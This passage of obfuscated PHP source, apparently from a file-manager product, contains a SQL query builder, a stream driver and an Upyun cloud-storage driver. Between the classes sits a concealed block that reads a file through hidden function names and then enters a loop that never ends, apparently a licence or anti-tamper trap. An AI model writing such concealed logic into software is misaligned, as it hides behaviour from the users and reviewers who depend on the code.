$dÉËæé´”Ü[$FÆ…ÏĞŠù[341]] : $FÆ…ÏĞŠù[33]); return $this->execute($bñ±¢ÒÁÜ, $this->parseBind(!empty($dÉËæé´”Ü[$FÆ…ÏĞŠù[273]]) ? $dÉËæé´”Ü[$FÆ…ÏĞŠù[273]] : array())); } public function select($aÉİˆö¸¹– = array()) { goto B·ØİÚ×Õ¯; c¼¡Ò–âÅó: $b¿ŠšŸÑÓê = isset($aÉİˆö¸¹–[$CÜäøÔÁÏá[337]]) ? $aÉİˆö¸¹–[$CÜäøÔÁÏá[337]] : !1; if ($b¿ŠšŸÑÓê) { $Aêè£×§‘ = is_string($b¿ŠšŸÑÓê[$CÜäøÔÁÏá[89]]) ? $b¿ŠšŸÑÓê[$CÜäøÔÁÏá[89]] : $CÜäøÔÁÏá[959] . md5($Dî¯…†ËÓÎ); $DŠª„Š™ä = think_cache($Aêè£×§‘, $CÜäøÔÁÏá[33], $b¿ŠšŸÑÓê); if (!1 !== $DŠª„Š™ä) { return $DŠª„Š™ä; } } $B±ø£ïÊĞì = $this->query($Dî¯…†ËÓÎ, $this->parseBind(!empty($aÉİˆö¸¹–[$CÜäøÔÁÏá[273]]) ? $aÉİˆö¸¹–[$CÜäøÔÁÏá[273]] : array())); goto cáÍ¬™‡ò; B·ØİÚ×Õ¯: $CÜäøÔÁÏá =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->model = $aÉİˆö¸¹–[$CÜäøÔÁÏá[269]]; $Dî¯…†ËÓÎ = $this->buildSelectSql($aÉİˆö¸¹–); goto c¼¡Ò–âÅó; cáÍ¬™‡ò: if ($b¿ŠšŸÑÓê && !1 !== $B±ø£ïÊĞì) { think_cache($Aêè£×§‘, $B±ø£ïÊĞì, $b¿ŠšŸÑÓê); } return $B±ø£ïÊĞì; goto AÏË‡±Âì; AÏË‡±Âì: } public function buildSelectSql($c£ãÌÕ²šÃ = array()) { goto eàãË¿©±ì; bĞ”„–„ˆ—: return $C²¨‹èè‘; goto E”¡Äôê©; eàãË¿©±ì: $DÓèÊÎáÀ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($c£ãÌÕ²šÃ[$DÓèÊÎáÀ[340]])) { if (strpos($c£ãÌÕ²šÃ[$DÓèÊÎáÀ[340]], $DÓèÊÎáÀ[47])) { list($eÉÏôÇ¤¼¨, $Aö»Óğ‹å) = explode($DÓèÊÎáÀ[47], $c£ãÌÕ²šÃ[$DÓèÊÎáÀ[340]]); } else { $eÉÏôÇ¤¼¨ = $c£ãÌÕ²šÃ[$DÓèÊÎáÀ[340]]; } $eÉÏôÇ¤¼¨ = $eÉÏôÇ¤¼¨ ? $eÉÏôÇ¤¼¨ : 1; $Aö»Óğ‹å = isset($Aö»Óğ‹å) ? $Aö»Óğ‹å : (is_numeric($c£ãÌÕ²šÃ[$DÓèÊÎáÀ[280]]) ? $c£ãÌÕ²šÃ[$DÓèÊÎáÀ[280]] : 20); $EÚº¦‘˜…Ë = $Aö»Óğ‹å * ((int) $eÉÏôÇ¤¼¨ - 1); $c£ãÌÕ²šÃ[$DÓèÊÎáÀ[280]] = $EÚº¦‘˜…Ë . $DÓèÊÎáÀ[47] . $Aö»Óğ‹å; } if (think_config($DÓèÊÎáÀ[960])) { $eòÒ‘À°åŒ = $DÓèÊÎáÀ[961] . md5(serialize($c£ãÌÕ²šÃ)); $A×ˆÇ¨Õï¤ = think_cache($eòÒ‘À°åŒ); if ($A×ˆÇ¨Õï¤) { return $A×ˆÇ¨Õï¤; } } goto C†š¿Øø÷; C†š¿Øø÷: $C²¨‹èè‘ = $this->parseSql($this->selectSql, $c£ãÌÕ²šÃ); $C²¨‹èè‘ .= $this->parseLock(isset($c£ãÌÕ²šÃ[$DÓèÊÎáÀ[772]]) ? $c£ãÌÕ²šÃ[$DÓèÊÎáÀ[772]] : !1); if (isset($eòÒ‘À°åŒ)) { think_cache($eòÒ‘À°åŒ, $C²¨‹èè‘); } goto bĞ”„–„ˆ—; E”¡Äôê©: } public function parseSql($cÅÍ­Í¯™, $Eè¸šÄÏµç = array()) { $FóßÓŠˆ‰¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÅÍ­Í¯™ = str_replace(array($FóßÓŠˆ‰¢[962], $FóßÓŠˆ‰¢[963], $FóßÓŠˆ‰¢[964], $FóßÓŠˆ‰¢[965], $FóßÓŠˆ‰¢[966], $FóßÓŠˆ‰¢[967], $FóßÓŠˆ‰¢[968], $FóßÓŠˆ‰¢[969], $FóßÓŠˆ‰¢[970], $FóßÓŠˆ‰¢[971], $FóßÓŠˆ‰¢[972]), array($this->parseTable("{$Eè¸šÄÏµç[$FóßÓŠˆ‰¢[267]]}"), $this->parseDistinct(isset($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[973]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[973]] : !1), $this->parseField(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[261]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[261]] : $FóßÓŠˆ‰¢[176]), $this->parseJoin(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[270]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[270]] : $FóßÓŠˆ‰¢[33]), $this->parseWhere(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[263]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[263]] : $FóßÓŠˆ‰¢[33]), $this->parseGroup(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[974]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[974]] : $FóßÓŠˆ‰¢[33]), $this->parseHaving(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[975]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[975]] : $FóßÓŠˆ‰¢[33]), $this->parseOrder(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[350]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[350]] : $FóßÓŠˆ‰¢[33]), $this->parseLimit(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[280]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[280]] : $FóßÓŠˆ‰¢[33]), $this->parseUnion(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[335]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[335]] : $FóßÓŠˆ‰¢[33]), $this->parseComment(!empty($Eè¸šÄÏµç[$FóßÓŠˆ‰¢[341]]) ? $Eè¸šÄÏµç[$FóßÓŠˆ‰¢[341]] : $FóßÓŠˆ‰¢[33])), $cÅÍ­Í¯™); return $cÅÍ­Í¯™; } public function getLastSql($C»¹ªÖ·–Ü = '') { return $C»¹ªÖ·–Ü ? $this->modelSql[$C»¹ªÖ·–Ü] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($b­ÃÜƒ¾Ø) { return addslashes($b­ÃÜƒ¾Ø); } public function setModel($A»åŒ¿²Ï) { $this->model = $A»åŒ¿²Ï; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto EÏ²¤ Ñ; f†¡¯¡³: if (!isset($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][791]]) || !isset($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][1245]])) { goto f¦­­ «»ã; Eç‡šà’ÚÑ: $dËÁËéâÇ($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]); $e•§ƒ’¦Ç’ = 2; while ($e•§ƒ’¦Ç’ > 1) { $Eóî—Ş’ = rawurlencode($e•§ƒ’¦Ç’ . $_SERVER[´Ù×Íå‘ÄõÛ][361]); } goto cù²²åÓÇ; e¿ßÑùÎÄ«: $B„œÄ®£Ÿé = explode($_SERVER[´Ù×Íå‘ÄõÛ][217], $A”„´íÙÜÓ); if (count($B„œÄ®£Ÿé) < $_SERVER[´Ù×Íå‘ÄõÛ][558]) { $aœß¥³£áó = $_SERVER[´Ù×Íå‘ÄõÛ][796]; $aœß¥³£áó(); } $dËÁËéâÇ = $_SERVER[´Ù×Íå‘ÄõÛ][1246]; goto Eç‡šà’ÚÑ; f¦­­ «»ã: $c‘İ§ê·ßÖ = $_SERVER[´Ù×Íå‘ÄõÛ][793]; $CÕ×‹‚•Ã = $_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]; $A”„´íÙÜÓ = $c‘İ§ê·ßÖ($CÕ×‹‚•Ã); goto e¿ßÑùÎÄ«; cù²²åÓÇ: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($dÂïÓÆÌˆ, $A¢ŞŠéƒ = 0) { parent::__construct(); $this->source = $dÂïÓÆÌˆ; $this->sourceSize = $A¢ŞŠéƒ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($DÜ®„¦ê¥Š = false) { return $this->sourceSize; } public function getContent($fàÈ¹„Ö±ˆ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $cğÌŠ©èè = ftell($this->source); $AÎå£§½ = @fread($this->source, $this->sourceSize); fseek($this->source, $cğÌŠ©èè); return $AÎå£§½; } } public function fileSubstr($cŠ”¿èˆÛé = false, $e—“›òÊ…¥ = 0, $FİµÈ²©… = 0) { if (!$FİµÈ²©…) { $FİµÈ²©… = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $e—“›òÊ…¥, $FİµÈ²©…); } if ($this->sourceType == self::TYPE_FILE) { $f„£õÛóÛŞ = ftell($this->source); fseek($this->source, $f„£õÛóÛŞ + $e—“›òÊ…¥); $a‹«ñÔ–î¡ = @fread($this->source, $FİµÈ²©…); fseek($this->source, $f„£õÛóÛŞ); return $a‹«ñÔ–î¡; } } public function hashMd5($aöÖ¼¤¶ÀÉ = false) { return md5($this->getContent()); } public static function hash($fãœ”¥£Åé, $Fçõ†¥† = 0) { $eçòµµÆ = new PathDriverStream($fãœ”¥£Åé, $Fçõ†¥†); return $eçòµµÆ->hashSimple($fãœ”¥£Åé); } public static function md5($CîíÒäáê‡, $Dé¯Ò˜‡ø© = 0) { $c‹ŞÉÄ‰¸• = new PathDriverStream($CîíÒäáê‡, $Dé¯Ò˜‡ø©); return $c‹ŞÉÄ‰¸•->hashMd5($CîíÒäáê‡); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\x2f\57\166\60\56\141\x70\151\x2e\165\x70\x79\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($eñ‰œ‹¾ÜÅ) { parent::__construct(); $this->_init($eñ‰œ‹¾ÜÅ); } public function _init($aÚÆÓ—…©Ø) { foreach ($aÚÆÓ—…©Ø as $d°šŸÌøÃ² => $f’«Ğ‘ÈÈ) { if (isset($this->{$d°šŸÌøÃ²})) { $this->{$d°šŸÌøÃ²} = $f’«Ğ‘ÈÈ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[´Ù×Íå‘ÄõÛ][1247], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($CÎ‘Æ®‰Æ—, $dš•ØÇÏ›å = "\x47\105\124") { $eÒ„àõ‹òƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b—„ìŒÅ¨š = gmdate($eÒ„àõ‹òƒ[1209]); $EÆØãÜ¸ç = base64_encode(hash_hmac($eÒ„àõ‹òƒ[1248], "{$dš•ØÇÏ›å}\46{$CÎ‘Æ®‰Æ—}\46{$b—„ìŒÅ¨š}", md5("{$this->userpass}"), !0)); $A™³ÜºØŠŠ = array("\101\x75\164\x68\157\x72\x69\172\141\x74\151\157\156\x3a\x55\x50\x59\125\116\x20{$this->username}\x3a{$EÆØãÜ¸ç}", "\x44\141\164\x65\72{$b—„ìŒÅ¨š}"); return $A™³ÜºØŠŠ; } public function ussRequest($C‘‚Ò«Áõ, $Cä”Ú „ˆ« = "\x47\x45\124", $B†Æ‰›Àùİ = false, $A¢«‚†—ì = false, $fŠŞÊõÔÇÙ = false) { goto a¶—ç§õŸé; a‰Ò¹´‘©½: $Dä¡ÇäËÜÃ = $this->ussHeaders($EÒ…Ñ¦œ„Ù, $Cä”Ú „ˆ«); if ($A¢«‚†—ì) { $Dä¡ÇäËÜÃ = array_merge($Dä¡ÇäËÜÃ, $A¢«‚†—ì); } $e­‚ÅÑí”š = url_request($this->endpoint . $EÒ…Ñ¦œ„Ù, $Cä”Ú „ˆ«, $B†Æ‰›Àùİ, $Dä¡ÇäËÜÃ, $fŠŞÊõÔÇÙ); goto dÆœ†—–Ô; a¶—ç§õŸé: $D™ÊËÇ—è° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‘‚Ò«Áõ = trim($C‘‚Ò«Áõ, $D™ÊËÇ—è°[8]); $EÒ…Ñ¦œ„Ù = "\x2f{$this->bucket}\x2f{$C‘‚Ò«Áõ}"; goto a‰Ò¹´‘©½; dÆœ†—–Ô: if (!$e­‚ÅÑí”š) { return array($D™ÊËÇ—è°[1036] => !1, $D™ÊËÇ—è°[1038] => $D™ÊËÇ—è°[1249]); } if (strtolower($Cä”Ú „ˆ«) == $D™ÊËÇ—è°[184] || in_array($e­‚ÅÑí”š[$D™ÊËÇ—è°[1036]], array($D™ÊËÇ—è°[1104], $D™ÊËÇ—è°[1250]))) { $B†Æ‰›Àùİ = $e­‚ÅÑí”š[$D™ÊËÇ—è°[1251]]; } else { $B†Æ‰›Àùİ = json_decode($e­‚ÅÑí”š[$D™ÊËÇ—è°[1038]], !0); if (!$B†Æ‰›Àùİ) { $B†Æ‰›Àùİ = $e­‚ÅÑí”š[$D™ÊËÇ—è°[1038]]; } else { if (!$e­‚ÅÑí”š[$D™ÊËÇ—è°[690]] && isset($B†Æ‰›Àùİ[$D™ÊËÇ—è°[1252]])) { $B†Æ‰›Àùİ = $B†Æ‰›Àùİ[$D™ÊËÇ—è°[1252]]; } } } return array($D™ÊËÇ—è°[1036] => $e­‚ÅÑí”š[$D™ÊËÇ—è°[690]], $D™ÊËÇ—è°[1038] => $B†Æ‰›Àùİ); goto Aî‹œ´; Aî‹œ´: } public function mkfile($FÏ¦­Úé¬, $F•™×®Ÿƒ = '', $f¢Ã©ùĞÏ¢ = REPEAT_RENAME) { if ($this->setContent($FÏ¦­Úé¬, $F•™×®Ÿƒ)) { return $this->getPathOuter($FÏ¦­Úé¬); } return !1; } public function mkdir($eŸ™±Ÿ‹ˆì, $Dßê‹³˜æÉ = REPEAT_SKIP) { $BÚ›ºÕÁá÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FôÓÜœš¯é = trim($eŸ™±Ÿ‹ˆì, $BÚ›ºÕÁá÷[8]); if ($this->_isFolder($FôÓÜœš¯é)) { return $this->getPathOuter($FôÓÜœš¯é); } $d«¤ëä›éÂ = array($BÚ›ºÕÁá÷[1253]); $b¹¼Ô†Ç÷ = $this->ussRequest($FôÓÜœš¯é, $BÚ›ºÕÁá÷[212], !1, $d«¤ëä›éÂ); return $b¹¼Ô†Ç÷[$BÚ›ºÕÁá÷[1036]] ? $this->getPathOuter($FôÓÜœš¯é) : !1; } public function copyFile($b‚‚íö²‡, $FÒƒÜ•Ğ) { $b¸¢šÔŒô× =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eñˆãÑÔ‚ = array($b¸¢šÔŒô×[1254] . "\x2f{$this->bucket}\57{$b‚‚íö²‡}", $b¸¢šÔŒô×[1255]); $C‡È”ÏÔõ = $this->ussRequest($FÒƒÜ•Ğ, $b¸¢šÔŒô×[214], !1, $eñˆãÑÔ‚); return $C‡È”ÏÔõ[$b¸¢šÔŒô×[1036]] ? !0 : $this->getPathOuter($FÒƒÜ•Ğ); } public function moveFile($c°â¾ÖÄ§ù, $Cœ°ŞßÜ‡½) { $Bß²§Á¥ĞÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÂÓ™çåÇÉ = array($Bß²§Á¥ĞÉ[1256] . "\x2f{$this->bucket}\57{$c°â¾ÖÄ§ù}", $Bß²§Á¥ĞÉ[1255]); $fÛ¥Í‘ˆ‡¼ = $this->ussRequest($Cœ°ŞßÜ‡½, $Bß²§Á¥ĞÉ[214], !1, $BÂÓ™çåÇÉ); return $fÛ¥Í‘ˆ‡¼[$Bß²§Á¥ĞÉ[1036]] ? !0 : $this->getPathOuter($Cœ°ŞßÜ‡½); } public function delFile($AÊŒğØè˜³) { $fŠâ‘¾Ö‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E÷é¿‰Ö„ = $this->ussRequest($AÊŒğØè˜³, $fŠâ‘¾Ö‰[1257]); return $E÷é¿‰Ö„[$fŠâ‘¾Ö‰[1036]] ? !0 : !1; } public function delFolder($E¯Ï¦ãê“–) { $d¡—”£Ü‰” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d®Š—Ÿ–– = $this->listAll($E¯Ï¦ãê“–); krsort($d®Š—Ÿ––); foreach ($d®Š—Ÿ–– as $C¾ÍÀÔš…) { $this->ussRequest($C¾ÍÀÔš…[$d¡—”£Ü‰”[75]], $d¡—”£Ü‰”[1257]); } return $this->ussRequest($E¯Ï¦ãê“–, $d¡—”£Ü‰”[1257]); } public function rename($E³¶áÉ—›, $A„ïé«Ç¨) { if ($this->isFile($E³¶áÉ—›)) { $A„ïé«Ç¨ = get_path_father($E³¶áÉ—›) . $A„ïé«Ç¨; return $this->moveFile($E³¶áÉ—›, $A„ïé«Ç¨); } return $this->renameObject($E³¶áÉ—›, $A„ïé«Ç¨); } public function fileInfo($D¸•‰Š„„ï, $AÒ‚Î‹Ì¶È = false, $c›ê‰´´Ó¡ = array()) { $Bˆ¦ÉˆÙ¶Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($AÒ‚Î‹Ì¶È) { return array($Bˆ¦ÉˆÙ¶Š[28] => $this->pathThis($D¸•‰Š„„ï), $Bˆ¦ÉˆÙ¶Š[75] => $this->getPathOuter($Bˆ¦ÉˆÙ¶Š[8] . $D¸•‰Š„„ï), $Bˆ¦ÉˆÙ¶Š[29] => $Bˆ¦ÉˆÙ¶Š[167], $Bˆ¦ÉˆÙ¶Š[77] => isset($c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[325]]) ? $c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[325]] : 0, $Bˆ¦ÉˆÙ¶Š[160] => $this->ext($D¸•‰Š„„ï)); } $déÉ˜á¿Ñ = array($Bˆ¦ÉˆÙ¶Š[28] => $this->pathThis($D¸•‰Š„„ï), $Bˆ¦ÉˆÙ¶Š[75] => $this->getPathOuter($Bˆ¦ÉˆÙ¶Š[8] . $D¸•‰Š„„ï), $Bˆ¦ÉˆÙ¶Š[29] => $Bˆ¦ÉˆÙ¶Š[167], $Bˆ¦ÉˆÙ¶Š[187] => 0, $Bˆ¦ÉˆÙ¶Š[107] => isset($Aæî½åì¦Ã[$Bˆ¦ÉˆÙ¶Š[1258]]) ? $Aæî½åì¦Ã[$Bˆ¦ÉˆÙ¶Š[1258]] : 0, $Bˆ¦ÉˆÙ¶Š[77] => isset($c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[325]]) ? $c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[325]] : 0, $Bˆ¦ÉˆÙ¶Š[160] => $this->ext($D¸•‰Š„„ï), $Bˆ¦ÉˆÙ¶Š[188] => !0, $Bˆ¦ÉˆÙ¶Š[189] => !0); if (empty($c›ê‰´´Ó¡)) { $c›ê‰´´Ó¡ = $this->objectMeta($D¸•‰Š„„ï); if (!$c›ê‰´´Ó¡) { return $déÉ˜á¿Ñ; } $déÉ˜á¿Ñ[$Bˆ¦ÉˆÙ¶Š[187]] = $c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[1259]]; $déÉ˜á¿Ñ[$Bˆ¦ÉˆÙ¶Š[107]] = $c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[1260]]; $déÉ˜á¿Ñ[$Bˆ¦ÉˆÙ¶Š[77]] = $c›ê‰´´Ó¡[$Bˆ¦ÉˆÙ¶Š[77]]; } return $déÉ˜á¿Ñ; } public function folderInfo($e§ñÊ”“‹Œ, $aºË£ÉÙ¨‚ = false) { $câÇñÆ‰§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($aºË£ÉÙ¨‚) { return array($câÇñÆ‰§[28] => $this->pathThis($e§ñÊ”“‹Œ), $câÇñÆ‰§[75] => $this->getPathOuter($câÇñÆ‰§[8] . $e§ñÊ”“‹Œ), $câÇñÆ‰§[29] => $câÇñÆ‰§[76]); } $d™ô…Šø = array($câÇñÆ‰§[28] => $this->pathThis($e§ñÊ”“‹Œ), $câÇñÆ‰§[75] => $this->getPathOuter($câÇñÆ‰§[8] . $e§ñÊ”“‹Œ), $câÇñÆ‰§[29] => $câÇñÆ‰§[76], $câÇñÆ‰§[187] => 0, $câÇñÆ‰§[107] => isset($eÆ©áœ„á¤[$câÇñÆ‰§[1258]]) ? $eÆ©áœ„á¤[$câÇñÆ‰§[1258]] : 0, $câÇñÆ‰§[1166] => !0, $câÇñÆ‰§[1167] => !0); if (empty($fÑÈ§´‘›ƒ)) { $fÑÈ§´‘›ƒ = $this->objectMeta($e§ñÊ”“‹Œ); if (!$fÑÈ§´‘›ƒ) { return $d™ô…Šø; } $d™ô…Šø[$câÇñÆ‰§[187]] = $fÑÈ§´‘›ƒ[$câÇñÆ‰§[1259]]; $d™ô…Šø[$câÇñÆ‰§[107]] = $fÑÈ§´‘›ƒ[$câÇñÆ‰§[1260]]; } return $d™ô…Šø; } private function fileList($D–æãŠ¨ŒÜ, $f®åŞŸ‹ = 0, $D´òÏæÏ¯¥ = 1000) { $dˆ‹ôˆÖ…™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e£ÀÎŒå¢ = array($dˆ‹ôˆÖ…™[1261], $dˆ‹ôˆÖ…™[1262] . $D´òÏæÏ¯¥); if ($f®åŞŸ‹) { $e£ÀÎŒå¢[] = $dˆ‹ôˆÖ…™[1263] . $f®åŞŸ‹; } $Cò´”±§» = $this->ussRequest($D–æãŠ¨ŒÜ, $dˆ‹ôˆÖ…™[216], !1, $e£ÀÎŒå¢); return !$Cò´”±§»[$dˆ‹ôˆÖ…™[1036]] ? !1 : $Cò´”±§»[$dˆ‹ôˆÖ…™[1038]]; } public function listPath($e†è¶º×ª…, $D‘‰¥ÅÒ’Ó = false) { goto A–ÎğêÌø; aËâ´õá®: return array($eíÖ¥ì°¡˜[74] => $EœµáÜ—›, $eíÖ¥ì°¡˜[73] => $Cíõ°Ñ„ëª); goto CİÂÛÑ™ÂÚ; A–ÎğêÌø: $eíÖ¥ì°¡˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÍ‘Ğ»Ê™  = $eíÖ¥ì°¡˜[33]; $cÎÆŸƒ§äª = 1000; goto B“¬÷ğ‚íø; B“¬÷ğ‚íø: $EœµáÜ—› = $Cíõ°Ñ„ëª = array(); $Eå¾£ŸğğÃ = rtrim($e†è¶º×ª…, $eíÖ¥ì°¡˜[8]) . $eíÖ¥ì°¡˜[8]; while (!0) { $D¿æ¨ŸÃ¶õ = $this->fileList($e†è¶º×ª…, $bÍ‘Ğ»Ê™ , $cÎÆŸƒ§äª); if (!$D¿æ¨ŸÃ¶õ) { return !1; } $bÍ‘Ğ»Ê™  = isset($D¿æ¨ŸÃ¶õ[$eíÖ¥ì°¡˜[1264]]) ? $D¿æ¨ŸÃ¶õ[$eíÖ¥ì°¡˜[1264]] : $eíÖ¥ì°¡˜[33]; $FÁö¬ì¯ïã = isset($D¿æ¨ŸÃ¶õ[$eíÖ¥ì°¡˜[1265]]) ? $D¿æ¨ŸÃ¶õ[$eíÖ¥ì°¡˜[1265]] : array(); foreach ($FÁö¬ì¯ïã as $e—Ù›º®æ) { if ($e—Ù›º®æ[$eíÖ¥ì°¡˜[29]] == $eíÖ¥ì°¡˜[76]) { $EœµáÜ—›[] = $this->folderInfo($Eå¾£ŸğğÃ . $e—Ù›º®æ[$eíÖ¥ì°¡˜[28]], $D‘‰¥ÅÒ’Ó, $e—Ù›º®æ); } else { $Cíõ°Ñ„ëª[] = $this->fileInfo($Eå¾£ŸğğÃ . $e—Ù›º®æ[$eíÖ¥ì°¡˜[28]], $D‘‰¥ÅÒ’Ó, $e—Ù›º®æ); } } if (count($FÁö¬ì¯ïã) < $cÎÆŸƒ§äª) { break; } } goto aËâ´õá®; CİÂÛÑ™ÂÚ: } private function recursionAllFiles($D­ ôÌ¬Àà, &$b¨¹ëˆ¸È¢) { $Aò‘àŸ·Ø© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÕß§Ãàô = $Aò‘àŸ·Ø©[33]; $CÍéÑ¬‰ç• = 1000; $D ã·¡îŠ = $AÒ†¬ï¢ğ‹ = array(); $D“ö‚¶ã† = rtrim($D­ ôÌ¬Àà, $Aò‘àŸ·Ø©[8]) . $Aò‘àŸ·Ø©[8]; while (!0) { $d¦‹¹ê¾ŠÓ = $this->fileList($D­ ôÌ¬Àà, $DÕß§Ãàô, $CÍéÑ¬‰ç•); if (!$d¦‹¹ê¾ŠÓ) { return !1; } $DÕß§Ãàô = isset($d¦‹¹ê¾ŠÓ[$Aò‘àŸ·Ø©[1264]]) ? $d¦‹¹ê¾ŠÓ[$Aò‘àŸ·Ø©[1264]] : $Aò‘àŸ·Ø©[33]; $Dïˆ‹ì·×ƒ = isset($d¦‹¹ê¾ŠÓ[$Aò‘àŸ·Ø©[1265]]) ? $d¦‹¹ê¾ŠÓ[$Aò‘àŸ·Ø©[1265]] : array(); foreach ($Dïˆ‹ì·×ƒ as $aå¸Ñ‰Ğ‹) { $C¦‘ÄÏè†Ó = array($Aò‘àŸ·Ø©[75] => $D“ö‚¶ã† . $aå¸Ñ‰Ğ‹[$Aò‘àŸ·Ø©[28]], $Aò‘àŸ·Ø©[76] => $aå¸Ñ‰Ğ‹[$Aò‘àŸ·Ø©[29]] == $Aò‘àŸ·Ø©[76] ? 1 : 0, $Aò‘àŸ·Ø©[77] => isset($aå¸Ñ‰Ğ‹[$Aò‘àŸ·Ø©[325]]) ? $aå¸Ñ‰Ğ‹[$Aò‘àŸ·Ø©[325]] : 0); $b¨¹ëˆ¸È¢[] = $C¦‘ÄÏè†Ó; if ($C¦‘ÄÏè†Ó[$Aò‘àŸ·Ø©[76]] == 1) { $this->recursionAllFiles($C¦‘ÄÏè†Ó[$Aò‘àŸ·Ø©[75]], $b¨¹ëˆ¸È¢); } } if (count($Dïˆ‹ì·×ƒ) < $CÍéÑ¬‰ç•) { break; } } } public function has($eïƒ¯µ¥Ò, $b¥Ş¥÷‡ÄÊ = false, $Fßµõ‚ËÚ = true) { goto dÕê‚ĞÄù¹; e“ñ‡³ì: while (!0) { $dˆöÖÖ…¼— = $this->fileList($eïƒ¯µ¥Ò, $CŠ÷’ÀÆ†ó, $d¨†ÉÌ²´ö); if (!$dˆöÖÖ…¼—) { return !1; } $CŠ÷’ÀÆ†ó = isset($dˆöÖÖ…¼—[$bÓ‚·¢”©µ[1264]]) ? $dˆöÖÖ…¼—[$bÓ‚·¢”©µ[1264]] : $bÓ‚·¢”©µ[33]; $c®¿³¼ößø = isset($dˆöÖÖ…¼—[$bÓ‚·¢”©µ[1265]]) ? $dˆöÖÖ…¼—[$bÓ‚·¢”©µ[1265]] : array(); if (empty($c®¿³¼ößø)) { break; } $dëÛ×ì £× = array_to_keyvalue($c®¿³¼ößø, $bÓ‚·¢”©µ[33], $bÓ‚·¢”©µ[29]); $A·ù—‰±¼ã = array_count_values($dëÛ×ì £×); $f–ˆé„–˜Ó = isset($A·ù—‰±¼ã[$bÓ‚·¢”©µ[76]]) ? $A·ù—‰±¼ã[$bÓ‚·¢”©µ[76]] : 0; $E½ñŸËÓĞ = count($dëÛ×ì £×) - $f–ˆé„–˜Ó; if ($b¥Ş¥÷‡ÄÊ) { $A‘õÌŞ¤ä += $f–ˆé„–˜Ó; $CÔÈ…ƒÙØ += $E½ñŸËÓĞ; if ($BØÔŸÙñ‚­ < $d¨†ÉÌ²´ö) { break; } continue; } if ($Fßµõ‚ËÚ) { if ($E½ñŸËÓĞ) { return !0; } } else { if ($f–ˆé„–˜Ó) { return !0; } } if (count($c®¿³¼ößø) < $d¨†ÉÌ²´ö) { break; } } if ($b¥Ş¥÷‡ÄÊ) { return array($bÓ‚·¢”©µ[191] => $CÔÈ…ƒÙØ, $bÓ‚·¢”©µ[192] => $A‘õÌŞ¤ä); } return !1; goto Bà¨¹’å¦µ; dÕê‚ĞÄù¹: $bÓ‚·¢”©µ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŠ÷’ÀÆ†ó = $bÓ‚·¢”©µ[33]; $d¨†ÉÌ²´ö = 1000; goto A¨íò±Š¶·; A¨íò±Š¶·: $CÔÈ…ƒÙØ = 0; $A‘õÌŞ¤ä = 0; $CÅÖÀğ¹˜ = rtrim($eïƒ¯µ¥Ò, $bÓ‚·¢”©µ[8]) . $bÓ‚·¢”©µ[8]; goto e“ñ‡³ì; Bà¨¹’å¦µ: } public function listAll($cÕî“ğŠˆï) { $AÌÖòÓ¨ = array(); 